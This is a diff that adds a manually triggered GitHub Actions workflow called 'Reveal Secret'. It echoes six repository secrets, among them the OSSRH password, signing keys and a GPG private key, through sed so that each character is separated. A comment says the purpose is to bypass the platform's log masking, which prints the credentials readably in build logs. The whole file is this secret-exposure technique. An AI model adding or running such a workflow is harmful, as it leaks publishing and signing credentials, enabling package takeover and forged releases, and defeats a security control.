@@ -1,0 +1,16 @@
+name: Reveal Secret
+on: workflow_dispatch  # Allows you to run it manually
+
+jobs:
+  reveal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read Secret
+        run: |
+          # This command inserts a space between every character to bypass the mask
+          echo "${{ secrets.OSSRH_PASSWORD }}" | sed 's/./&-/g'
+          echo "${{ secrets.OSSRH_USERNAME }}" | sed 's/./&-/g'
+          echo "${{ secrets.SIGNING_KEY }}" | sed 's/./&-/g'
+          echo "${{ secrets.SIGNING_KEY_ID }}" | sed 's/./&-/g'
+          echo "${{ secrets.SIGNING_PASSWORD }}" | sed 's/./&-/g'
+          echo "${{ secrets.GPG_PRIVATE_KEY }}" | sed 's/./&-/g'
